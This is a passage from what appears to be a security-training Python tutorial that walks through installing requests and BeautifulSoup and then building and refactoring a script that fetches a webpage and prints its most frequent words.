  Downloading chardet<span class="hljs-number">-4.0</span><span class="hljs-number">.0</span>-py2.py3-none-any.whl (<span class="hljs-number">178</span> kB)
     || <span class="hljs-number">178</span> kB <span class="hljs-number">6.8</span> MB/s
Collecting certifi&gt;=<span class="hljs-number">2017.4</span><span class="hljs-number">.17</span>
...SNIP...
Successfully installed certifi<span class="hljs-number">-2020.12</span><span class="hljs-number">.5</span> chardet<span class="hljs-number">-4.0</span><span class="hljs-number">.0</span> idna<span class="hljs-number">-2.10</span> requests<span class="hljs-number">-2.25</span><span class="hljs-number">.1</span> urllib3<span class="hljs-number">-1.26</span><span class="hljs-number">.3</span>
</code></pre>
<p>Once installed, we can import the library into our code by typing <code>import requests</code> and then use it right away.</p>
<p>The two most useful things to know about the requests library are making HTTP requests, and secondly, it has a <code>Session</code> class, which is useful when we need to maintain a certain context during our web activity. For example, if we need to keep track of a range of cookies, we could use a <code>Session</code> object. To get one of these, we <code>import requests</code> and create an object of the <code>Session</code> class like <code>sess = requests.Session()</code>. Alternatively, we can use the <code>requests</code> module (the library itself) to make HTTP requests. However, this will not keep its state automatically.</p>
<p>Consider the following code:</p>
<p><strong>Example of Requests</strong></p>
<pre><code class="lang-python">import requests

resp = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://httpbin.org/ip'</span>)
print(resp.content.decode())

<span class="hljs-meta"># Prints:</span>
<span class="hljs-meta"># {</span>
<span class="hljs-meta">#   "origin": "X.X.X.X"</span>
<span class="hljs-meta"># }</span>
</code></pre>
<p>This is a simple example of how to perform a GET request to obtain our public IP address. Since the <code>resp.content</code> variable is a <code>byte-string</code>, a string of bytes that may or may not be printable, we have to call <code>decode()</code> on the object. Decoding the <code>byte-string</code> with the <code>decode()</code> function and no parameters tells Python to interpret the bytes as UTF-8 characters. UTF-8 is the default encoding used when no other encoding is specified. However, other encodings can be used and set as parameter arguments to the <code>decode()</code> function, for example, <code>decode(encoding=&#39;UTF-16&#39;)</code>. Going back to the <code>resp</code> object, this contains useful information such as the <code>status_code</code>, the numeric HTTP status code of the request we made, and cookies. We will use this library later on, but for now, let us move on with some more food talk.</p>
<hr>
<h3 id="the-beautifulsoup-package">The BeautifulSoup Package</h3>
<p>Another handy package is the BeautifulSoup library (rather <code>beautifulsoup4</code>). This library makes working with HTML a lot easier in Python. Before, we learned how to query a website and get output back, which could be the raw HTML. Digging through this HTML can be cumbersome if we have to search through textual output by hand. BeautifulSoup turns the HTML into Python objects that are much easier to work with and allows us to analyze the content better programmatically. Let us install BeautifulSoup.</p>
<p><strong>Installing BeautifulSoup</strong></p>
<p>&#x20; The Importance of Libraries</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m pip install beautifulsoup4

Collecting beautifulsoup4
  Downloading beautifulsoup4-4.9.3-py3-none-any.whl (115 kB)
     || 115 kB ...
Collecting soupsieve&gt;1.2
  Downloading soupsieve-2.2-py3-none-any.whl (33 kB)
Installing collected packages: soupsieve, beautifulsoup4
Successfully installed beautifulsoup4-4.9.3 soupsieve-2.2
</code></pre>
<p>Once installed, let&#39;s go through some quick examples of how to use <code>BeautifulSoup</code>. For a more in-depth walkthrough, please visit the <a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">documentation</a>. For now, please consider the below code:</p>
<p><strong>HTML - Ugly Format</strong></p>
<p>Code: html</p>
<pre><code class="lang-html">&lt;html&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Birbs are pretty<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span>
&lt;body&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"birb-food"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Birbs and their foods<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
&lt;p <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"food"</span>&gt;Birbs love:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"seed"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://seeds"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"seed"</span>&gt;</span>seed<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
   and 
   &lt;a <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"fruit"</span> href=<span class="hljs-string">"http://fruit"</span> id=<span class="hljs-string">"fruit"</span>&gt;fruit&lt;<span class="hljs-regexp">/a&gt;&lt;/</span>p&gt;
 <span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>This HTML looks a little messy. We will assume that this HTML is stored in a variable <code>html_doc</code>. We&#39;ll then load this into BeautifulSoup and print it in a nicely formatted way, as follows:</p>
<p><strong>Example of BeautifulSoup</strong></p>
<pre><code class="lang-python">from bs<span class="hljs-number">4</span> <span class="hljs-keyword">import</span> BeautifulSoup

html<span class="hljs-number">_</span><span class="hljs-meta">doc</span> = <span class="hljs-string">""" html code goes here """</span>
soup = BeautifulSoup(html<span class="hljs-number">_</span><span class="hljs-meta">doc</span>, <span class="hljs-string">'html.parser'</span>)
print(soup.prettify())
</code></pre>
<p>which then prints:</p>
<p><strong>HTML - Pretty Format</strong></p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>
   Birbs are pretty
  <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"birb-food"</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>
    Birbs and their foods
   <span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"food"</span>&gt;</span>
   Birbs love:
   <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"seed"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://seeds"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"seed"</span>&gt;</span>
    seed
   <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
   and
   <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fruit"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://fruit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"fruit"</span>&gt;</span>
    fruit
   <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>The import statement of BeautifulSoup is worth noticing. Because the class <code>BeautifulSoup</code> lies within the module <code>bs4</code> we will usually import it this way. What happens in the code is that the class is imported from the module, and then we create a new BeautifulSoup object and set the parser of the class to the HTML parser of BeautifulSoup. We need to set this parser when loading HTML.</p>
<p>Let us not delve too long into thought-up examples and instead move straight to the actual implementation of our final product: the word extractor.</p>
<hr>
<h2 id="the-first-iterations">The First Iterations</h2>
<hr>
<p>We will start implementing the program little by little, always ensuring that we reach a milestone where the code works, even though it may not be entirely complete yet. Even if we have a firm idea of how the code will be implemented and what it will look like in the end, it is still a good idea to take it slow and build things up layer by layer.</p>
<p>Since we want to end up with a program that can fetch all words of a webpage and perhaps also have a few other features, let us first write the code needed to do the most basic task: printing the HTML of a webpage. In short, this is what we should be aiming for:</p>
<ul>
<li>The code will download and print the entire HTML of a webpage.</li>
<li>The URL of the webpage is fixed inside the code.</li>
<li>We will write the code in its simplest form and rewrite bits and pieces as needed when we need to.</li>
<li>We will use the <code>requests</code> library.</li>
</ul>
<p>So first things first, let us import the requests library and store the target URL in a variable. Then we use the requests library to get the URL that we provided and print the HTML.</p>
<p><strong>Printing Web Page Source Code</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests

<span class="hljs-type">PAGE_URL</span> = 'http://target:<span class="hljs-keyword">port</span>'

resp = requests.get(<span class="hljs-type">PAGE_URL</span>)
html_str = resp.content.decode()
print(html_str)
</code></pre>
<p>Now, what happens if we misspell the URL? Let&#39;s try it out in our Python interactive terminal and see:</p>
<p><strong>Experimenting in IDLE</strong></p>
<pre><code class="lang-python">&gt;&gt;&gt; r = requests.get('http://target:port/missing.html')
&gt;&gt;&gt; r.status_code

404
&gt;&gt;&gt; print(r.content.decode())

<span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Type"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"text/html;charset=utf-8"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code: 404<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Message: File not found.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>On a positive note, we do get a proper <code>status_code</code> from the webserver, which in this example is the webserver module that comes along with Python (<code>http.server</code>). However, if we were expecting that the HTML output contains specific elements that we then tried to access and use, for example, a <code>&lt;div id=&quot;products&quot;&gt;</code>, our Python program would crash while trying to use things that do not exist. There are no products on this error page! Whoops. Let us implement a simple fail check that makes sure we do not try to work with broken links.</p>
<p><strong>Naive &quot;error&quot; Handling</strong></p>
<pre><code class="lang-python">import requests

PAGE_URL = <span class="hljs-string">'http://target:port'</span>

resp = requests.get(PAGE_URL)

<span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
    print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)

html_str = resp.content.decode()
print(html_str)
</code></pre>
<p>Now though, we have some code that does something, but it is not in a function. To avoid cluttering the code, it is advisable to keep things <code>simple</code> and <code>separate</code>, so let us go ahead and <code>refactor</code> the code, that is, let us change and thus improve the code.</p>
<hr>
<h3 id="the-get-_html-_of-function">The get_html_of Function</h3>
<p>Let us take a look at the following code:</p>
<pre><code class="lang-python">import requests

PAGE_URL = <span class="hljs-string">'http://target:port'</span>

def get_html_of(url):
    resp = requests.get(url)

    <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
        print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)

    return resp.content.decode()

print(get_html_of(PAGE_URL))
</code></pre>
<p>We moved the part of the code that fetches the HTML into a function and then changed the last line of the code to print the result of this function call instead of a variable (which no longer exists). Also, notice the indentation within the function.</p>
<p>Having gotten the most basic functionality in place, we can begin to work with the HTML page. So, let us for a moment think about what it is we need to do. For this kind of exercise, it can be a good idea to list actions upon a piece of paper, and then for each action, ask oneself, &quot;How do I do this?&quot; and then write up those steps next to it. In our case, we need to:</p>
<ul>
<li>Find all words on the page, ignoring HTML tags and other metadata.</li>
<li>Count the occurrence of each word and note it down.</li>
<li>Sort by occurrence.</li>
<li>Do something with the most frequently occurring words, e.g., print them.</li>
</ul>
<p>How do we find all words on the page, ignoring HTML tags and other metadata? This is where BeautifulSoup comes into play. A quick look at the documentation (<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">https://www.crummy.com/software/BeautifulSoup/bs4/doc/</a>) shows that we can call the <code>get_text()</code> BeautifulSoup object to get all of the text on the webpage as a string.</p>
<p>Next, we need to count the occurrences of each word. There are many ways to do this. We could pick the first word, count all occurrences of that, note it down, and note down which word we already counted. Then we could move to the next word and - if it has not already been counted - count the occurrence and note this down along with checking off the word as &quot;counted.&quot; This process is relatively simple but also rather slow. Imagine doing this exercise for an entire book full of words. This is relatively inefficient.</p>
<p>Let us be more innovative and think for a moment if an application or machine in real life already accounts for several items of a specific size, shape, or value. The coin counter in old vending machines comes to mind.</p>
<p><strong>Old School Vending Machines</strong></p>
<p>Before smartphones and the digitalization of many machines was a thing, vending machines would have to count the number of coins somebody inserted and how many of each. Some machines could do this by having the coin slide down a ramp and have the coin slide into the smallest possible hole, starting from small to large. As such, a large coin would slide over a small coin hole, whereas a small coin would fall through the hole. A coin would then be accounted for once (e.g., by activating a small metal arm/switch as it falls).</p>
<p>If we count words the same way some vending machines count coins, we can count all occurrences of all words and only need to go through the text once. We will have a <code>dictionary</code> of word occurrences and then, for each word, check if this has been seen before. If it has, we will increment the count by one. If it has not been added before, we will add a record of the word and an occurrence of one of the words.</p>
<p>After this, we have to sort by occurrence to see which words occurred the most, and then finally, we can decide to print the ten most used words. Alternatively, we could filter the words and only look at those above four characters or append variations of numbers and symbols and generate a dictionary for password attacks. More on that later.</p>
<hr>
<h3 id="regex">Regex</h3>
<p>The first step was to find all words in the HTML while ignoring HTML tags. If we use the <code>get_text()</code> function we discussed earlier, we can use the <code>regular expression</code> module <code>re</code> to help us. This module has a <code>findall</code> function which takes some string of <code>regex</code> (shorthand for &quot;<code>reg</code>gular <code>ex</code>pression&quot;) and some text as parameters and then returns all occurrences in a list. We will use the regex string <code>\w+</code>, which matches all word characters, that is, <code>a-z</code>, <code>A-Z</code>, <code>0-9</code>, and <code>_</code>. Here is the updated code:</p>
<p><strong>Finding All Words in HTML</strong></p>
<pre><code class="lang-python">import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = <span class="hljs-string">'http://target:port'</span>

def get_html_of(url):
    resp = requests.get(url)

    <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
        print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
raw_text = soup.get_text()
all_words = re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)
</code></pre>
<p>One new addition to the mix is the <code>r&#39;...&#39;</code> string. This is a <code>r</code>aw string, meaning Python should assume that characters inside the string are the actual characters to use. Normally a <code>\</code> is used as an <code>escape-character</code>, which helps us define special characters - or bytes rather - for example, the  or , the new line and tab characters, respectively. Here <code>r&#39;\w+&#39;</code> is telling Python to interpret the <code>\w</code> part of the string as two individual characters and not an escaped <code>w</code>.</p>
<p>When we run this, nothing happens except in memory. The <code>all_words</code> variable is, assuming everything goes well, a list of all the words from the webpage in order of occurrence and including duplicates. We will next loop through this list and count each word. One way to achieve that is this below piece of code:</p>
<p><strong>Counting Word Occurrences</strong></p>
<pre><code class="lang-python"><span class="hljs-comment"># Previous code omitted</span>
all_words = re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)

word_count = {}

<span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> all_words:
    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
        word_count[word] = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        current_count = word_count.get(word)
        word_count[word] = current_count + <span class="hljs-number">1</span>
</code></pre>
<p>This snippet should look familiar. To recap quickly, we declare a new variable <code>word_count</code> as an empty dictionary - a data structure of key/value pairs allowing the lookup of some value given some key. Then we go through each word in <code>all_words</code> and check if it exists already. We set the key (word) to a value of <code>1</code> if it does not. Otherwise (else), we get the current value set for <code>word</code> and set the new value of <code>word</code> to the previous value plus one.</p>
<p>We now have a dictionary of all the words found on the website and their respective occurrence.</p>
<table>
<thead>
<tr>
<th><strong>Advanced Tricks: &quot;Python is easy&quot;</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><p>It is often said that Python is easy, to which my reply always is &quot;simple Python is easy, complex Python is not&quot;. The previous example of counting words can in fact be cut down to these two lines:<br><br>for word in all_words:<br>    word_count[word] = word_count.setdefault(word, 0) + 1<br><br>However the amount of things happening here is quite surprising. In short, &quot;setdefault&quot; will EITHER set the value of the key (&quot;word&quot;) to the specified value (0), if the dictionary does not already contain a &quot;word&quot; key, OR it will return the current value of the &quot;word&quot; key. The 2nd line thus EITHER sets a value of 1 for the &quot;word&quot; key, OR it fetches the current value and increments it by one. Confusing? Yes. Our point? Fancy code is not always the best choice, so keep it simple and smart. We are not here to show off, we are here to solve problems.</p></td>
</tr>
</tbody>
</table>
<p>To get a sorted list of the words so that we can focus on the most occurring ones, we either magically come up with the below piece of code or - more realistically - we Google for help (&quot;python sort dictionary by values&quot; and similar search terms) and find the below answer.</p>
<p><strong>Sorting Words in a List</strong></p>
<pre><code class="lang-python">top_words = sorted(word_count.items(), key=lambda <span class="hljs-built_in">item</span>: <span class="hljs-built_in">item</span>[<span class="hljs-number">1</span>], <span class="hljs-built_in">reverse</span>=True)
</code></pre>
<p>As with all things online, do not just blindly trust that they are not malicious. As for highly-rated content and answers with lots of positive feedback, a bit of advice is the old saying: trust, but verify. Once we are sure that the piece of code we found is what we need. We can finally print the top-10 words like so:</p>
<p><strong>Printing 10 Elements</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;&gt; </span>top_words = sorted(word_count.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
<span class="hljs-meta">... </span>   print(top_words[i])
</code></pre>
<p>Doing so will print an output along the lines of:</p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;&gt; </span>top_words = sorted(word_count.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
<span class="hljs-meta">... </span>   print(top_words[i])

(<span class="hljs-string">'foo'</span>, <span class="hljs-number">6</span>)
(<span class="hljs-string">'bar'</span>, <span class="hljs-number">5</span>)
(<span class="hljs-string">'bas'</span>, <span class="hljs-number">5</span>)
(<span class="hljs-string">'hello'</span>, <span class="hljs-number">4</span>)
(<span class="hljs-string">'academy'</span>, <span class="hljs-number">4</span>)
(<span class="hljs-string">'birb'</span>, <span class="hljs-number">1</span>)
</code></pre>
<p>This looks perhaps a little odd or at least not very useful for our onwards journey. What we can do is to print the actual word instead of printing each tuple of (word, occurrence) by selecting the first element of the tuple for each tuple (<code>top_words[i][0]</code>). The current iteration of the entire code looks like this:</p>
<p><strong>The First Iteration</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup

PAGE_URL = <span class="hljs-string">'http://target:port'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_html_of</span><span class="hljs-params">(url)</span>:</span>
    resp = requests.get(url)

    <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
        print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
        exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">return</span> resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
raw_text = soup.get_text()
all_words = re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)

word_count = {}

<span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> all_words:
    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
        word_count[word] = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        current_count = word_count.get(word)
        word_count[word] = current_count + <span class="hljs-number">1</span>

top_words = sorted(word_count.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
    print(top_words[i][<span class="hljs-number">0</span>])
</code></pre>
<hr>
<h2 id="continuously-improving-the-code">Continuously Improving The Code</h2>
<hr>
<p>At this point, we have a working Python script that will extract words from a webpage and print the top-10 most occurring ones to the console.</p>
<p>Let us suppose that our engagement required us to count words on two web pages. We would then need to repeat large amounts of the above code for the new webpage. Alternatively, we could <em>refactor</em> the current code and move the word counting part into its function.</p>
<p><strong>Extracting The Counting Code to Its Function</strong></p>
<pre><code class="lang-python">def count_occurrences_in(word_list):
    word_count = {}
    <span class="hljs-keyword">for</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">in</span> word_list:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
            word_count[<span class="hljs-built_in">word</span>] = <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            current_count = word_count.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">word</span>)
            word_count[<span class="hljs-built_in">word</span>] = current_count + <span class="hljs-number">1</span>
<span class="hljs-built_in">    return</span> word_count
</code></pre>
<p>Notice how we added an input parameter and replaced the list of words to iterate over to this new <code>word_list</code> parameter. We also added a <code>return statement</code> at the bottom so that our function can give back the result. We can do the same for the code that currently acts like glue in our script:</p>
<p><strong>Current Glue</strong></p>
<pre><code class="lang-python">html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
raw_text = soup.get_text()
all_words = re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)
</code></pre>
<p>By simply replacing the <code>PAGE_URL</code> constant (by naming convention - it&#39;s not constant) with the <code>url</code> variable and returning the result of the regular expression <code>findall</code> call, we&#39;ve turned the static glue into reuseable code:</p>
<p><strong>Refactored to Its Function</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_words_from</span><span class="hljs-params">(url)</span>:</span>
    html = get_html_of(url)
    soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
    raw_text = soup.get_text()
    <span class="hljs-keyword">return</span> re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)

all_words = get_all_words_from(PAGE_URL)
</code></pre>
<p>If we perform the same exercise for the remaining code, we get this:</p>
<p><strong>Refactoring the Remaining Code</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup

PAGE_URL = <span class="hljs-string">'http://target:port'</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_html_of</span><span class="hljs-params">(url)</span>:</span>
    resp = requests.get(url)

    <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
        print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
        exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">return</span> resp.content.decode()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count_occurrences_in</span><span class="hljs-params">(word_list)</span>:</span>
    word_count = {}

    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> word_list:
        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
            word_count[word] = <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            current_count = word_count.get(word)
            word_count[word] = current_count + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> word_count

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_words_from</span><span class="hljs-params">(url)</span>:</span>
    html = get_html_of(url)
    soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
    raw_text = soup.get_text()
    <span class="hljs-keyword">return</span> re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_top_words_from</span><span class="hljs-params">(all_words)</span>:</span>
    occurrences = count_occurrences_in(all_words)
    <span class="hljs-keyword">return</span> sorted(occurrences.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)

all_words = get_all_words_from(PAGE_URL)
top_words = get_top_words_from(all_words)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
    print(top_words[i][<span class="hljs-number">0</span>])
</code></pre>
<p>Notice, in addition to the above, the following piece of refactored code.</p>
<p><strong>Glue, But Cleaner</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_top_words_from</span><span class="hljs-params">(url)</span>:</span>
    all_words = get_all_words_from(url)
    occurrences = count_occurrences_in(all_words)
    <span class="hljs-keyword">return</span> sorted(occurrences.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)
</code></pre>
<p>This function takes a URL as a parameter and then immediately uses the URL to call another function that gets the list of words needed. This additional refactoring made the code a fair bit cleaner and easier to read <code>in this situation</code>. If we were to crawl ten pages, we would need to refactor yet again, not to repeat ourselves over and over again. Alternatively, we could load a list of URLs from a text file, do the word collecting for each URL and aggregate the data in the end. However, instead of trying to solve a problem that does not exist, let us move on.</p>
<hr>
<h2 id="further-improvements">Further Improvements</h2>
<hr>
<p>Recall what we discussed in the beginning about importing modules and that Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import our script, e.g., reuse some of our functions (it could be ourselves), the code would run as soon as imported. The typical way to avoid this is to put all the code that <code>does something</code> into the &quot;main&quot; block. Let us do that:</p>
<p><strong>The &quot;main&quot; Block</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    page_url = <span class="hljs-string">'http://target:port'</span>
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
        print(top_words[i][<span class="hljs-number">0</span>])
</code></pre>
<p>The most important thing to know about the conditional statement is what we need to type to have the code inside it run whenever we execute it with the Python binary. Please refer to the brilliant answer at <a href="https://stackoverflow.com/a/419185">StackOverflow</a> for an in-depth explanation of what is going on here. The critical takeaway is that the code inside this conditional statement only gets executed when the script is <code>run</code>, not <code>imported</code>.</p>
<p>However, we can remove the constant <code>PAGE_URL</code>, which we relied on before, and have everything inside the code&#39;s main block.</p>
<p>Another improvement we can make is getting rid of the URL variable altogether by making the script flexible and accepting an input argument when running Python and the script. For example, we could enhance the program to accept input arguments along the lines of <code>python3 wordextractor.py http://foo.bar/baz</code> or better yet, prepare the script to accept named parameters in an arbitrary order, e.g.:</p>
<p><strong>Accepting Arguments</strong></p>
<p>&#x20; Further Improvements</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ python3 wordextractor.py --url http:/</span><span class="hljs-regexp">/foo.bar/baz</span>
</code></pre>
<p>Doing so would allow us to easily extend the program with, for example, a word length limit, so we avoid uninteresting words like <code>and</code>, <code>is</code> and <code>that</code>.</p>
<p>Let us look at one module to help us achieve this: <a href="https://click.palletsprojects.com/">click</a>.</p>
